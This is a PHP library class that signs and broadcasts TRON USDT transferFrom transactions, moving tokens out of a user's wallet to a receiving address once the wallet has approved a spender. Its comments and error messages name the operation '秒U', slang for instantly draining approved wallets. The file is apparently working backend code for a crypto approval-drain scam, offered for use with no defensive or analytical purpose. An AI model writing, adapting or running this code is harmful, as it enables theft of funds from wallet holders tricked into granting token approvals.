<?php

namespace app\common\library;

use Elliptic\EC;
use IEXBase\TronAPI\Exception\TronException;
use IEXBase\TronAPI\Provider\HttpProvider;
use IEXBase\TronAPI\Tron;
use think\Exception;

/**
 * TRON USDT 授权划扣（transferFrom，秒U）
 * 私钥仅用于单次签名，不入库、不写日志。
 */
class HecTronSweep
{
    const FEE_LIMIT_SUN = 100000000; // 100 TRX

    public static function createTron(): Tron
    {
        $headers = HecTron::trongridHeaders();
        $fullNode = new HttpProvider('https://api.trongrid.io', 30000, false, false, $headers);
        $solidityNode = new HttpProvider('https://api.trongrid.io', 30000, false, false, $headers);
        $eventServer = new HttpProvider('https://api.trongrid.io', 30000, false, false, $headers);
        return new Tron($fullNode, $solidityNode, $eventServer);
    }

    public static function normalizePrivateKey(string $privateKey): string
    {
        $key = trim($privateKey);
        if (strpos($key, '0x') === 0 || strpos($key, '0X') === 0) {
            $key = substr($key, 2);
        }
        if (!preg_match('/^[a-fA-F0-9]{64}$/', $key)) {
            throw new Exception('私钥格式无效，应为 64 位十六进制');
        }
        return strtolower($key);
    }

    /** 由私钥推导 TRON base58 地址 */
    public static function addressFromPrivateKey(string $privateKey): string
    {
        $tron = self::createTron();
        $key = self::normalizePrivateKey($privateKey);
        $ec = new EC('secp256k1');
        $priv = $ec->keyFromPrivate($key);
        $pubKeyHex = $priv->getPublic(false, 'hex');
        $pubKeyBin = hex2bin($pubKeyHex);
        $addressHex = $tron->getAddressHex($pubKeyBin);
        return $tron->getBase58CheckAddress(hex2bin($addressHex));
    }

    /**
     * 使用 spender 私钥从用户钱包划扣 USDT 到收款地址
     *
     * @return array{txid:string,amount:string,from:string,to:string,spender:string}
     */
    public static function transferFrom(
        string $privateKey,
        string $fromWallet,
        string $spenderAddress,
        string $toAddress,
        string $amountUsdt
    ): array {
        $privateKey = self::normalizePrivateKey($privateKey);
        $fromWallet = trim($fromWallet);
        $spenderAddress = trim($spenderAddress);
        $toAddress = trim($toAddress);
        $amountUsdt = trim($amountUsdt);

        if (!HecTron::isTronAddress($fromWallet)
            || !HecTron::isTronAddress($spenderAddress)
            || !HecTron::isTronAddress($toAddress)) {
            throw new Exception('钱包地址无效');
        }
        if (!is_numeric($amountUsdt) || bccomp($amountUsdt, '0', 6) <= 0) {
            throw new Exception('秒U数量必须大于 0');
        }

        $derivedSpender = self::addressFromPrivateKey($privateKey);
        if ($derivedSpender !== $spenderAddress) {
            throw new Exception('私钥与授权对象地址不匹配');
        }

        $amountRaw = HecTron::priceToRaw($amountUsdt);
        if (bccomp($amountRaw, '0', 0) <= 0) {
            throw new Exception('秒U数量过小');
        }

        $allowanceRaw = HecTron::fetchAllowance($fromWallet, $spenderAddress);
        if (bccomp($allowanceRaw, $amountRaw, 0) < 0) {
            throw new Exception(sprintf(
                '授权额度不足：需要 %s USDT，当前授权 %s USDT',
                $amountUsdt,
                HecTron::rawToAmount($allowanceRaw)
            ));
        }

        $balanceRaw = HecTron::fetchTokenBalance($fromWallet, HecTron::usdtContract());
        if (bccomp($balanceRaw, $amountRaw, 0) < 0) {
            throw new Exception(sprintf(
                '钱包 USDT 余额不足：需要 %s USDT，当前余额 %s USDT',
                $amountUsdt,
                HecTron::rawToAmount($balanceRaw)
            ));
        }

        $tron = self::createTron();
        $tron->setPrivateKey($privateKey);
        $tron->setAddress($spenderAddress);

        $abi = json_decode(file_get_contents(dirname(__DIR__, 3) . '/vendor/iexbase/tron-api/src/trc20.json'), true);
        if (!is_array($abi)) {
            throw new Exception('TRC20 ABI 加载失败');
        }

        try {
            $unsigned = $tron->getTransactionBuilder()->triggerSmartContract(
                $abi,
                $tron->address2HexString(HecTron::usdtContract()),
                'transferFrom',
                [
                    $tron->address2HexString($fromWallet),
                    $tron->address2HexString($toAddress),
                    $amountRaw,
                ],
                self::FEE_LIMIT_SUN,
                $tron->address2HexString($spenderAddress)
            );
            $signed = $tron->signTransaction($unsigned);
            $response = $tron->sendRawTransaction($signed);
        } catch (TronException $e) {
            throw new Exception('链上交易失败：' . $e->getMessage());
        } finally {
            $privateKey = '';
            unset($privateKey);
        }

        if (empty($response['result'])) {
            $msg = is_string($response['message'] ?? null)
                ? $response['message']
                : ($response['code'] ?? '广播失败');
            throw new Exception('交易广播失败：' . $msg);
        }

        $txid = (string)($signed['txID'] ?? $response['txid'] ?? '');
        if ($txid === '') {
            throw new Exception('交易已提交但未返回 txid');
        }

        return [
            'txid'    => $txid,
            'amount'  => $amountUsdt,
            'from'    => $fromWallet,
            'to'      => $toAddress,
            'spender' => $spenderAddress,
        ];
    }
}
